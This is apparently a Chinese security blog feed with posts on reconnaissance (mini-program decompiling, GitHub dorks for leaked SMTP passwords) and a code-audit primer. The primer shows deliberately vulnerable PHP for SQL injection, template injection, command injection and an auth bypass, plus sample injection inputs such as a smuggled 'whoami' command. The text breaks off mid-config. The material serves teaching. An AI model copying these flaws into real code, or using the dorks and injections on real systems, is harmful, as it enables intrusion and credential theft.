title="URL网站备案获取"></a>URL网站备案获取</h3><p>1、备案信息查询</p><p>2、网站上有APP下载</p><p>3、应用市场直接搜单位名称</p><h2 id="获取资产信息"><a href="#获取资产信息" class="headerlink" title="获取资产信息"></a>获取资产信息</h2><h3 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h3><p>假设一个场景，我们打开APP时，开启抓包但是没有数据，点击登录这个功能时抓到了包，得到了一个网址，但是这个网址在反编译后并没有得到</p><p>原因就是登录界面是APP打包的资源，并没有对外发送数据，而反编译也是一个静态分析的过程，所以我们还要进行一个动态的分析</p><p>但是如果我们打开APP时就有数据包，那通过静态分析能得到数据吗？</p><p>那也不一定，因为APP可能会对这些网址进行加密处理，一般的静态分析工具通过正则不一定可以匹配的到</p><p>这是一个动态分析的过程，但是我们在模拟器中抓包，肯定是抓不全的，和代理证书有关，不过可以借助下面的MobSF平台来实现动态调试</p><h3 id="提取"><a href="#提取" class="headerlink" title="提取"></a>提取</h3><p>使用一些工具和在线的平台</p><p>MobSF(自己手动搭建，可以动态和静态分析，推荐，<a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF">https://github.com/MobSF/Mobile-Security-Framework-MobSF</a> )、AppInfoScanner( <a href="https://github.com/kelvinBen/AppInfoScanner">https://github.com/kelvinBen/AppInfoScanner</a> ，推荐) </p><p>MobSF在进行动态调试时，需要在本地安装一个模拟器，比如逍遥模拟器即可</p><h1 id="小程序应用"><a href="#小程序应用" class="headerlink" title="小程序应用"></a>小程序应用</h1><h2 id="获取"><a href="#获取" class="headerlink" title="获取"></a>获取</h2><p>在各大平台（微信、支付宝等）搜索</p><h2 id="小程序抓包"><a href="#小程序抓包" class="headerlink" title="小程序抓包"></a>小程序抓包</h2><p>在基础篇提到过，就是burp和proxifier的联动</p><h2 id="小程序结构"><a href="#小程序结构" class="headerlink" title="小程序结构"></a>小程序结构</h2><h3 id="主体"><a href="#主体" class="headerlink" title="主体"></a>主体</h3><p>一个小程序的主体部分由三个文件组成，必须放在项目的根目录，如下</p><p>app.js — 必须要有，是小程序的逻辑</p><p>app.json — 必须要有，是小程序的公共配置</p><p>app.wxss — 不是必须的，是小程序的公共样式表</p><h3 id="页面"><a href="#页面" class="headerlink" title="页面"></a>页面</h3><p>页面由四个文件组成</p><p>xxx.js是页面逻辑，xxx.json是页面配置，xxx.wxml是页面结构，xxx.wxss是页面样式</p><h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><p>pages 页面文件夹， index 首页， logs 日志， util 工具类（mina框架自动生成）， app.js 入口js（类似于java类中的main方法）、全局js， app.json 全局配置文件， app.wxss 全局样式文件， project.config.json 跟你在详情中勾选的配置一样， sitemap.json 用来配置小程序及其页面是否允许被微信索引 </p><h2 id="小程序逆向"><a href="#小程序逆向" class="headerlink" title="小程序逆向"></a>小程序逆向</h2><p>推荐个工具 <a href="http://xcx.siqingw.top/">http://xcx.siqingw.top</a> ，目前只能在windows x86和x64 架构运行，具体操作方法网站上都有，这里大致说一下</p><p>这个工具在反编译小程序分两部分，选择解包文件和刷新反编译包，解包文件地址为小程序的目录地址，在电脑端的微信点击微信—文件管理，打开文件路径后回到它的上一级，选择Applet文件夹，可以把所有文件夹删掉，然后访问一下你想逆向的小程序，这个目录下面就会出现这个小程序的文件夹，这个就是你要解包的文件地址，选择里面的 .wxapkg文件即可，如果有多个.wxapkg文件，全选即可，不过要将__APP__.wxapkg放在第一个，解包后点击刷新反编译包即可，之后在操作区点击新版反编译，然后就可以在指定目录看到结果</p><p>之后使用微信官方的微信开发者工具，将刚刚反编译后的源码导入，即可进行调试，如果js加载有保存导致页面无法正常显示，可以在右上角的详情—本地设置—将JS编译成ESS的勾选给去掉，即可，将可视化打开，通过点击右侧的代码文件，左侧的可视化界面就会随之跳转</p><p>之后我们就可以先简单测试一下未授权访问之类的信息，比如小程序需要先登录，但是我们本地打开后访问一些文件，成功了就是未授权，或者在源码里搜索Accesskey之类的关键字，后面会详细讲解</p><h1 id="公开平台"><a href="#公开平台" class="headerlink" title="公开平台"></a>公开平台</h1><h2 id="微信公众号"><a href="#微信公众号" class="headerlink" title="微信公众号"></a>微信公众号</h2><h3 id="获取-1"><a href="#获取-1" class="headerlink" title="获取"></a>获取</h3><p><a href="https://weixin.sogou.com/">https://weixin.sogou.com</a> ，查询成功后看下有无第三方服务</p><h2 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h2><h3 id="监控"><a href="#监控" class="headerlink" title="监控"></a>监控</h3><p>人员、域名、邮箱等筛选，如xxx.cn password in:file</p><p>更多搜索规则可以自行查阅</p><p>关键字配合谷歌搜索：</p><p>site:Github.com smtp @qq.com</p><p>site:Github.com smtp password</p><p>site:Github.com String password smtp</p><h3 id="长期监控"><a href="#长期监控" class="headerlink" title="长期监控"></a>长期监控</h3><p><a href="https://github.com/madneal/gshark">https://github.com/madneal/gshark</a> ，<a href="https://github.com/Explorer1092/Github-Monitor">https://github.com/Explorer1092/Github-Monitor</a></p><h2 id="网盘搜索"><a href="#网盘搜索" class="headerlink" title="网盘搜索"></a>网盘搜索</h2><p>可以在百度网盘之类的直接搜索，也可以找一些接口</p><h2 id="邮箱搜集"><a href="#邮箱搜集" class="headerlink" title="邮箱搜集"></a>邮箱搜集</h2><p><a href="https://hunter.io/">https://hunter.io/</a></p><h1 id="信息搜集–工具集合"><a href="#信息搜集–工具集合" class="headerlink" title="信息搜集–工具集合"></a>信息搜集–工具集合</h1><p>先推荐个地址：<a href="https://github.com/guchangan1/All-Defense-Tool">https://github.com/guchangan1/All-Defense-Tool</a></p><h2 id="F8x"><a href="#F8x" class="headerlink" title="F8x"></a>F8x</h2><p><a href="https://github.com/ffffffff0x/f8x">https://github.com/ffffffff0x/f8x</a> ，一款自动化部署工具</p><h2 id="ENScan"><a href="#ENScan" class="headerlink" title="ENScan"></a>ENScan</h2><p>针对于企业信息查询，在配置文件中自己配置一些cookie和token即可</p><h2 id="AsamF"><a href="#AsamF" class="headerlink" title="AsamF"></a>AsamF</h2><p>集成了fofa、hunter、quake、zoomeye等平台，只需要在配置文件中把key配置好即可使用，优点就是hunter和quake导出是要花费积分的，使用这个工具可以免费导出，配置key的作用在于你的查询权限，如果你在平台上只能查询第一页，那就只能导出第一页</p><h2 id="ARL灯塔"><a href="#ARL灯塔" class="headerlink" title="ARL灯塔"></a>ARL灯塔</h2><p><a href="https://github.com/TophantTechnology/ARL">https://github.com/TophantTechnology/ARL</a> ，可以搜一下ARL魔改版的搭建，把指纹库之类的加了进去</p><h2 id="Nemo"><a href="#Nemo" class="headerlink" title="Nemo"></a>Nemo</h2><p><a href="https://github.com/hanc00l/nemo_go">https://github.com/hanc00l/nemo_go</a> </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;em&gt;大部分就是利用一些在线的威胁情报网站，很多技巧都集合在一些工具里，一般几乎都是傻瓜式的操作&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;业务资产&quot;&gt;&lt;a href=&quot;#业务资产&quot; class=&quot;headerlink&quot; title=&quot;业务资产&quot;&gt;&lt;/a&gt;业务资产&lt;/h1&gt;&lt;h2</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://ink-scholar.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="WEB" scheme="https://ink-scholar.github.io/tags/WEB/"/>
    
    <category term="信息搜集" scheme="https://ink-scholar.github.io/tags/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>代码审计概述</title>
    <link href="https://ink-scholar.github.io/2023/12/17/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A6%82%E8%BF%B0/"/>
    <id>https://ink-scholar.github.io/2023/12/17/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A6%82%E8%BF%B0/</id>
    <published>2023-12-17T12:43:25.221Z</published>
    <updated>2023-12-18T16:55:32.866Z</updated>
    
    <content type="html"><![CDATA[<p>先来一张图</p><img src="/2023/12/17/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A6%82%E8%BF%B0/image-20231217210117066.png" alt="image-20231217210117066" style="zoom:33%;"><p>术：漏洞利用的工具使用，什么代码、什么框架用什么工具；遇到什么站拿什么打（骚操作、技巧）</p><p>用：漏洞的挖掘思维，代码的审计思维，安全开发的思维（某一个门类的共性）</p><p>体：安全核心，安全思维，漏洞产生的根本原因，漏洞的抽象共性（整个安全的底层基础）</p><p>即 一线技巧 –》 思考者 –》 安全本质</p><p>个人觉得说的很好，深有感触 </p><h1 id="安全的本质"><a href="#安全的本质" class="headerlink" title="安全的本质"></a>安全的本质</h1><p>信任问题！</p><p>一切的安全方案设计的基础，都是建立在信任关系上的。我们必须相信一些东西，必须要有一些最基本的假设，安全方案才能得以建立。反之，如果我们否定一切，安全方案就会变成无源之水、无本之木，无法设计，也无法完成。</p><p>是否该信任普通用户的输入？（前台漏洞）</p><p>是否该信任管理员用户的输入？（后台漏洞）</p><p>是否该信任升级包、离线升级、在线升级、自动化升级？（供应链攻击）</p><p>不信任任何输入？（信任了输入的检测逻辑）</p><h1 id="安全方案模型"><a href="#安全方案模型" class="headerlink" title="安全方案模型"></a>安全方案模型</h1><p>所有的安全模型，都可以简化成一种最简易的模型：输入&#x3D;&#x3D;》检测是否有安全风险&#x3D;&#x3D;》输出</p><h1 id="为什么是输入？？"><a href="#为什么是输入？？" class="headerlink" title="为什么是输入？？"></a>为什么是输入？？</h1><p>所有的输入都是恶意的：入侵检测理论的名言</p><p>我们能掌控的只有输入：我们挖掘漏洞最好的入口点，也是也只能从输入去入手</p><p>在整个代码审计的过程中，一定要紧紧抓住输入，结合不同语言的特点，跟踪传播链条是否有可疑点</p><h1 id="程序希望用户输入什么"><a href="#程序希望用户输入什么" class="headerlink" title="程序希望用户输入什么"></a>程序希望用户输入什么</h1><h2 id="控制流与数据流"><a href="#控制流与数据流" class="headerlink" title="控制流与数据流"></a>控制流与数据流</h2><p>看两段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;Hello my name is :</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">console.<span class="title function_ invoke__">log</span>(Hello my name is :<span class="string">&quot; + &quot;</span>&lt;?php</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>将代码分成两部分，一部分是控制代码走向的控制流代码，另一部分是用来被展示、被存储、被流转的数据流代码（包括输入数据、程序员本来就硬编码的数据）</p><p><strong>程序员希望用户输入的一定数据流而不是控制流</strong></p><p>一旦我们  <strong>输入的数据</strong>  能够以某种方式侵入到控制流时，漏洞就产生了</p><p>如下</p><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$db</span> = <span class="title function_ invoke__">init_db</span>();</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select * from table where username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们看一下输入到流转：</p><p>输入 –》 php字符串变量 –》 sql语句 –》 数据库</p><p>在数据库层面，控制流是sql语句，原本这段代码的本意是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">action：select</span><br><span class="line">object：table</span><br><span class="line">subject：*</span><br><span class="line">condition：</span><br><span class="line">key：username</span><br><span class="line">value：$username</span><br></pre></td></tr></table></figure><p>代码保证用户的输入只能影响结构中的value位置，如果不能保障，就会出现漏洞</p><p>比如我们输入：<strong>admin’  and 1&#x3D;1#</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">action：select</span><br><span class="line">object：table</span><br><span class="line">subject：*</span><br><span class="line">condition：</span><br><span class="line">expression：and</span><br><span class="line">key1：username</span><br><span class="line">value1：$username</span><br><span class="line">key2: 1</span><br><span class="line">value2: 1</span><br></pre></td></tr></table></figure><p><strong>我们在代码层（PHP）的输入，导致了数据库（mysql）层的数据流入侵到了控制流</strong></p><h3 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h3><p>服务端模版注入</p><p>Twig是php的一套模板渲染的组件，但是不规范的渲染参数输入方式，可能导致模板注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&#x27;\twig\lib\Twig\Autoloader.php&#x27;</span>;</span><br><span class="line"><span class="title class_">Twig_Autoloader</span>::<span class="title function_ invoke__">register</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="variable">$twig</span> = <span class="keyword">new</span> <span class="title class_">Twig_Environment</span>(<span class="keyword">new</span> <span class="title class_">Twig_Loader_String</span>());</span><br><span class="line"><span class="variable">$output</span> = <span class="variable">$twig</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&quot;Hello &#123;&#123;name&#125;&#125;&quot;</span>, <span class="keyword">array</span>(<span class="string">&quot;name&quot;</span> =&gt; <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>]));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>以上这段代码是正确的，没有产生漏洞的，我们来看一下输入流转：</p><p>输入–》php字符串变量$_GET[“name”]–》Twig模板渲染–》发现变量–》找到变量name的绑定–》解析字符串–》渲染展示</p><p>我们再看一下错误的写法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&#x27;\twig\lib\Twig\Autoloader.php&#x27;</span>;</span><br><span class="line"><span class="title class_">Twig_Autoloader</span>::<span class="title function_ invoke__">register</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="variable">$twig</span> = <span class="keyword">new</span> <span class="title class_">Twig_Environment</span>(<span class="keyword">new</span> <span class="title class_">Twig_Loader_String</span>());</span><br><span class="line"><span class="variable">$output</span> = <span class="variable">$twig</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&quot;Hello <span class="subst">&#123;$_GET[&#x27;name&#x27;]&#125;</span>&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>再看一下输入流转：</p><p>输入–》php字符串变量$_GET[“name”]–》拼接字符串”Hello {$_GET[‘name’]}”作为新变量–》Twig模板渲染–》渲染展示</p><p><strong>我们在代码层（php）的输入，导致了Twig模板层的数据流入侵到了控制流</strong></p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$domain</span> = <span class="variable">$_GET</span>[<span class="string">&quot;domain&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;tracert &quot;&#x27;</span>.<span class="variable">$domain</span>.<span class="string">&#x27;&quot;&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个代码其实就是tracert命令</p><p>程序原意是在 <strong>bash程序</strong> 中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">execute：</span><br><span class="line">process:</span><br><span class="line">exe: tracert  --&gt; /bin/tracert</span><br><span class="line">arg: $domain</span><br></pre></td></tr></table></figure><p>此时，程序必须保证用户的输入只能影响到arg位置，如果不能保障，则会产生漏洞</p><p>比如输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">baidu.com&quot;;whoami;echo &quot;fuck qax</span><br></pre></td></tr></table></figure><p>此时代码里的拼接为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tracert &quot;baidu.com&quot;;whoami;echo &quot;fuck qax&#x27;</span><br></pre></td></tr></table></figure><p>此时代码执行的逻辑为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">execute：</span><br><span class="line">process1:</span><br><span class="line">exe: tracert  </span><br><span class="line">arg: &quot;baidu.com&quot;</span><br><span class="line">or--&gt;</span><br><span class="line">process2:</span><br><span class="line">exe: whoami</span><br><span class="line">arg: -</span><br><span class="line">or--&gt;</span><br><span class="line">exe: echo</span><br><span class="line">arg: &quot;fuck qax&quot;</span><br></pre></td></tr></table></figure><p><strong>我们在代码层（php）的输入，导致了bash程序层的数据流入侵到了控制流</strong></p><h2 id="业务流程问题"><a href="#业务流程问题" class="headerlink" title="业务流程问题"></a>业务流程问题</h2><p>很多逻辑漏洞、越权漏洞，往往来源于此，也是现代mvc结构出现比较多的问题。（现代mvc结构一般不会出现sql注入[预编译解决]、xss[前端框架解决]、webshell上传[java，python这种网站或者oss存储]）</p><h3 id="过度信任用户输入"><a href="#过度信任用户输入" class="headerlink" title="过度信任用户输入"></a>过度信任用户输入</h3><p>业务功能：输出当前用户信息</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$user_id</span> = <span class="keyword">int</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;user_id&#x27;</span>]);</span><br><span class="line"><span class="variable">$db</span> = <span class="title function_ invoke__">init_db</span>();</span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select * from user where user_id = <span class="subst">$user_id</span>&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">parse_user_profile</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这是一个典型的越权读取模型，虽然没有sql注入问题，但是在业务逻辑上的校验有漏洞，信任了用户输入的user_id</p><h3 id="不信任用户输入–即信任检测逻辑"><a href="#不信任用户输入–即信任检测逻辑" class="headerlink" title="不信任用户输入–即信任检测逻辑"></a>不信任用户输入–即信任检测逻辑</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//login.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type: text/html; charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;is_login&#x27;</span>J = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>] == <span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;is_login&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&quot;user_id&quot;</span>];     <span class="comment">// 假定管理员user_id=。</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;location: /user.php?is_login=l&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;密码错误&quot;</span>；</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// http://192.168.215.129/login.php?password=test&amp;user_id=123</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//user.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type: text/html; charset=utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;is_login&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;is_login&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;你登录了&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>] == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;你是管理员&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;你不是管理员&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;没登陆&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这是一个经典的逻辑绕过漏洞，在整个流程中，开发者完全没有信任用户的输入。</p><p>对密码进行了校验，校验通过才存session，并且用户id也是存储于session中的，没法通过cookie伪造绕过鉴权。</p><p><strong>不信任任何输入–》对输入进行检测</strong>（实际上就是把信任关系绑定到了对输入检测逻辑上，那么一旦<strong>输入检测逻辑出现问题</strong>，信任关系被打破，就出现了漏洞）</p><p><strong>php是弱类型语言，在php中，NULL &#x3D;&#x3D; false &#x3D;&#x3D; 0 &#x3D;&#x3D; “”</strong></p><p>所以上面的代码中，我们什么都不输入，就可以绕过检测</p><h1 id="用体-用-术看待问题"><a href="#用体-用-术看待问题" class="headerlink" title="用体-用-术看待问题"></a>用体-用-术看待问题</h1><p>盗张图</p><p><img src="/2023/12/17/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A6%82%E8%BF%B0/image-20231219004846286.png" alt="image-20231219004846286"></p><p><strong>切记！！！紧紧抓入输入，即能否让数据流逃逸到控制流，你的输入能否在业务逻辑上产生问题，如何根据污点分析快速筛选出有问题的业务</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;先来一张图&lt;/p&gt;
&lt;img src=&quot;/2023/12/17/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A6%82%E8%BF%B0/image-20231217210117066.png&quot; alt=&quot;image-2023121721</summary>
      
    
    
    
    <category term="代码审计" scheme="https://ink-scholar.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="代码审计" scheme="https://ink-scholar.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试--基础入门</title>
    <link href="https://ink-scholar.github.io/2023/12/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"/>
    <id>https://ink-scholar.github.io/2023/12/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/</id>
    <published>2023-12-14T14:33:04.392Z</published>
    <updated>2024-01-02T15:19:58.320Z</updated>
    
    <content type="html"><![CDATA[<p><em><strong>此篇主要写一点和web相关的基础知识，随便写写，不成系统</strong></em></p><h1 id="Web环境常规知识"><a href="#Web环境常规知识" class="headerlink" title="Web环境常规知识"></a>Web环境常规知识</h1><p>web应用系统常见的三种搭建方式：子域名、端口、目录三种方式</p><p>其他方式还有类似于博客园这种分配站的形式</p><p>网站数据库站库分离，现在常见的类型是云数据库RDS，安全性更高</p><p>对象存储OSS：只存储不解析，修复上传安全，但是存在Accesskey隐患</p><p>开源源码–源码可见&#x2F;源码不可见（加密，语言特性）</p><p>加密一般网上有对应的，比如asp、php加解密网站</p><p>语言特性比如java代码，从服务器上拖下来是一些class文件，此时需要反编译</p><p>路由访问：url和文件目录对应不上很正常，要根据配置路由决定</p><p>前后端分离：前端JS框架，API传输数据；前端页面大部分不存在漏洞，而后端管理大部分不在同域名，因此获得权限有可能不影响后端</p><p>类似于宝塔的打包类集成化环境，文件管理会锁定目录，命令无法执行，和权限有关</p><p>Docker容器：虚拟化技术， 独立磁盘空间，非真实的物理环境；因此衍生出docker逃逸，以后会写</p><p>WAF:</p><p><img src="/2023/12/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/image-20231217111805176.png" alt="image-20231217111805176"></p><p>CDN：内容分发服务，提高访问速度，可隐藏真实源IP</p><p>反向代理：</p><p>正向代理为客户端服务，客户端主动建立代理访问目标（不代理不可达）</p><p><img src="/2023/12/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/image-20231217130038060.png" alt="image-20231217130038060"></p><p>反向代理为服务端服务，服务端主动转发数据给可访问地址（不主动不可达）</p><p><img src="/2023/12/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/image-20231217130116573.png" alt="image-20231217130116573"></p><p>因此你的访问目标只是一个代理，而非真实的应用服务器</p><p>正向代理和反向代理都是解决访问不可达问题，由于反向代理中多出一个可以重定向解析的功能操作，导致反代理出的站点指向和真实的应用没有关系</p><p>负载均衡：分摊到多个操作单元上进行执行，共同完成工作任务；有多个服务器加载服务，测试过程中存在多个目标情况</p><p>在宝塔中可以如下进行配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 定义负载设置</span><br><span 